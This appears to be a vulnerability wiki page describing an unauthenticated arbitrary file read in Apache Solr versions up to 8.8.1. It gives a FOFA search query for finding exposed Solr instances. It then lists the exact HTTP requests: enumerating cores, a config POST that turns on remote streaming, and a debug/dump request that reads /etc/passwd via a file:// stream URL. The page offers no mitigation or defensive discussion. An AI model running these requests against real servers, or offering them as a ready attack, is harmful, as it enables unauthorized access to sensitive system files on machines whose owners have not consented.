---
title: Apache Solr config Arbitrary file reading vulnerability
---

# Apache Solr config Arbitrary file reading vulnerability

## Vulnerability Description

Apache Solr has an arbitrary file reading vulnerability, and an attacker can obtain sensitive files of the target server without authorization

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Apache Solr <= 8.8.1</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">
<a-button href="https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI%3D">FOFA: app="APACHE-Solr"</a-button>
</a-checkbox>

## Vulnerability reappears

Visit the Solr Admin Admin page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/deaf982e-2ddb-4021-9b5b-21ac946a910a.png)

Get core information

```
/solr/admin/cores?indexInfo=false&wt=json
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220307142829893.png)

Send a request

```
POST /solr/core/config 
Content-Type: application/json

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
```

Read the file again

```
POST /solr/core/debug/dump?param=ContentStreams 

stream.url=file:///etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220307142740665.png)